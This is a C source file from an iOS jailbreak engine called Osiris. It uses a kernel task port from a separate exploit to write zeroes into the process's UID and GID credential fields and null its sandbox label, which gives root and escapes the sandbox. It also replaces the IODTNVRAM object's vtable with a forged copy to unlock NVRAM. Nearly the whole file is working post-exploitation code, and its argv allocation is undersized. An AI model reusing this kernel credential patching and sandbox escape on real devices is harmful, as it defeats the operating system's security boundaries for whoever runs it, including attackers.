//
//  osirisJailbreak.c
//  GeoSetter
//
//  Created by GeoSn0w on 8/24/19.
//  Copyright © 2019 GeoSn0w. All rights reserved.
//

#include "osirisJailbreak.h"
#include "exploit.h"
#include "offsets.h"
#include "kernel_memory.h"
#include "IOKitLib.h"
#include <mach/mach.h>
#include <sys/mman.h>
#include "log.h"
#include <spawn.h>
#include "iosurface.h"

// Vars
uint64_t ucred_field, ucred;
static uint64_t origNVRAM_VTABLE = 0;
static uint64_t fake_nvram_vtable = 0;
static io_service_t IODTNVRAMSrv = MACH_PORT_NULL;
static const size_t kernel_buffer_size = 0x4000;
static const size_t max_vtable_size = 0x1000;
const uint64_t searchNVRAMProperty = 0x590;
const uint64_t getOFVariablePerm = 0x558;
task_port_t tfp0;

// Funcs
void executeCommandAtFuckingPath(const char* path, int argc, ...);
void nvram_unlock_func(void);
void nvram_lockback_func(void);
uint64_t findOurselves(void);
int elevatePrivsAndShaiHulud(void);
void restore_credentials(uint64_t ucred_field, uint64_t ucred);

// Hello :-)

int initOsiris(task_port_t tzero){
    printf("\n[*] Initializing Osiris Jailbreak Engine...\n");
    tfp0 = tzero;
    nvram_unlock_func();
    findOurselves();
    assume_kernel_credentials(&ucred_field, &ucred);
    if (elevatePrivsAndShaiHulud() == 0){
        return 0;
    } else {
        return -1;
    }
}

int deinitOsiris(){
    restore_credentials(ucred_field, ucred);
    return 0;
}
// Hell breaks loose

uint64_t kernel_forge_pacda(uint64_t pointer, uint64_t context) {
    // Not planning any A12 support as I don't have an A12 to test on.
    return pointer;
}

uint64_t kernel_xpaci(uint64_t pointer) {
    return pointer;
}

uint64_t kernel_xpacd(uint64_t pointer) {
    return pointer;
}

uint64_t findOurselves(){
    static uint64_t self = 0;
    if (!self) {
        self = rk64(current_task + 0x358);
        printf("[i] Found Ourselves at 0x%llx\n", self);
    }
    return self;
}

int elevatePrivsAndShaiHulud(){
        unsigned off_ucred_cr_uid = 0x18;
        unsigned off_ucred_cr_ruid = 0x1c;
        unsigned off_ucred_cr_svuid = 0x20;
        unsigned off_ucred_cr_rgid = 0x68;
        unsigned off_ucred_cr_svgid = 0x6c;
        unsigned off_ucred_cr_label = 0x78;
        unsigned off_p_uid = 0x28;
        unsigned off_p_gid = 0x2C;
        unsigned off_p_ruid = 0x30;
        unsigned off_p_rgid = 0x34;
        unsigned off_p_ucred = 0xF8;
        unsigned off_sandbox_slot = 0x10;
    
        printf("[i] Preparing to elevate own privileges!\n");
        uint64_t selfProc = findOurselves();
        uint64_t creds = rk64(selfProc + off_p_ucred);
        
        // GID
        wk32(selfProc + off_p_gid, 0);
        wk32(selfProc + off_p_rgid, 0);
        wk32(creds + off_ucred_cr_rgid, 0);
        wk32(creds + off_ucred_cr_svgid, 0);
        printf("[i] STILL HERE!!!!\n");
        
        // UID
        creds = rk64(selfProc + off_p_ucred);
        wk32(selfProc + off_p_uid, 0);
        wk32(selfProc + off_p_ruid, 0);
        wk32(creds + off_ucred_cr_uid, 0);
        wk32(creds + off_ucred_cr_ruid, 0);
        wk32(creds + off_ucred_cr_svuid, 0);
        printf("[i] Set UID = 0\n");
        
        // ShaiHulud
        creds = rk64(selfProc + off_p_ucred);
        uint64_t cr_label = rk64(creds + off_ucred_cr_label);
        wk64(cr_label + off_sandbox_slot, 0);
    
        if (geteuid() == 0) {
            
            FILE * testfile = fopen("/var/mobile/OsirisJailbreak", "w");
                if (!testfile) {
                    printf("[i] We failed! Still Sandboxed\n");
                    return -2; // Root, but sandboxed :/
                }else {
                    printf("[i] Nuked SandBox, FREEEEEEEEE!!!!!!\n");
                    printf("[+] Wrote file OsirisJailbreak to /var/mobile/OsirisJailbreak successfully!\n");
                    return 0; // FREE!!!!
                }
            
        } else {
            return -1; // Not even root :(
        }
    return 0;
}

uint64_t iodtnvram_fetch_ls(void) {
    if (!MACH_PORT_VALID(IODTNVRAMSrv)) {
        IODTNVRAMSrv = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IODTNVRAM"));
    };
    assert(MACH_PORT_VALID(IODTNVRAMSrv));
    uint64_t nvram_up;
    bool ok = kernel_ipc_port_lookup(current_task, IODTNVRAMSrv, &nvram_up, NULL);
    assert(ok);
    uint64_t IODTNVRAMObj = rk64(nvram_up + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    return IODTNVRAMObj;
}

void nvram_unlock_func() {
    uint64_t obj = iodtnvram_fetch_ls();
    origNVRAM_VTABLE = rk64(obj);
    uint64_t vtable_xpac = kernel_xpacd(origNVRAM_VTABLE);
    uint64_t *buf = calloc(1, max_vtable_size);
    assert(buf);
    
    kread(vtable_xpac, buf, max_vtable_size);
    buf[getOFVariablePerm/sizeof(uint64_t)] = kernel_xpaci(buf[searchNVRAMProperty/sizeof(uint64_t)]);
    
    kern_return_t kr = mach_vm_allocate(tfp0, &fake_nvram_vtable, kernel_buffer_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        ERROR("%s returned %d: %s", "mach_vm_allocate", kr, mach_error_string(kr));
        printf("[!] Could not allocate kernel buffer\n");
    }
    printf("[+] Allocated kernel buffer at 0x%016llx\n", fake_nvram_vtable);

    size_t count = 0;
    for (; count < max_vtable_size / sizeof(*buf); count++) {
        uint64_t vmethod = buf[count];
        if (vmethod == 0) {
            break;
        }
    }
    
    kwrite(fake_nvram_vtable, buf, count*sizeof(*buf));
    wk64(obj, kernel_forge_pacda(fake_nvram_vtable, 0)); // Just in case I ever support A12...
    free(buf);
    return;
}

void nvram_lockback_func() {
    printf("[i] Preparing to lock the NVRAM back...\n");
    if (fake_nvram_vtable == 0 || origNVRAM_VTABLE == 0) {
        printf("[!] Already locked?\n");
        return;
    }
    
    if (origNVRAM_VTABLE != 0) {
        uint64_t obj = iodtnvram_fetch_ls();
        wk64(obj, origNVRAM_VTABLE);
    }
    
    if (fake_nvram_vtable != 0) {
        mach_vm_deallocate(mach_task_self(), fake_nvram_vtable, kernel_buffer_size);
        fake_nvram_vtable = 0;
    }
    
    if (MACH_PORT_VALID(IODTNVRAMSrv)) {
        IOServiceClose(IODTNVRAMSrv);
        IODTNVRAMSrv = MACH_PORT_NULL;
        printf("[i] CLosing IOService (IODTNVRAMSrv)...\n");
    }
    printf("[*] NVRAM locked\n");
    return;
}

void executeCommandAtFuckingPath(const char* path, int argc, ...) {
    printf("[i] Preparing to execute command at path: %s\n", path);
    va_list ap;
    va_start(ap, argc);
    
    const char ** argv = malloc(argc+2);
    argv[0] = path;
    for (int i = 1; i <= argc; i++) {
        argv[i] = va_arg(ap, const char*);
    }
    va_end(ap);
    argv[argc+1] = NULL;
    
    posix_spawn(NULL, path, NULL, NULL, (char *const*)argv, NULL);
    free(argv);
    return;
}

void restore_credentials(uint64_t ucred_field, uint64_t ucred) {
    printf("[*] Restoring process' credentials...\n");
    wk64(ucred_field, ucred);
    return;
}
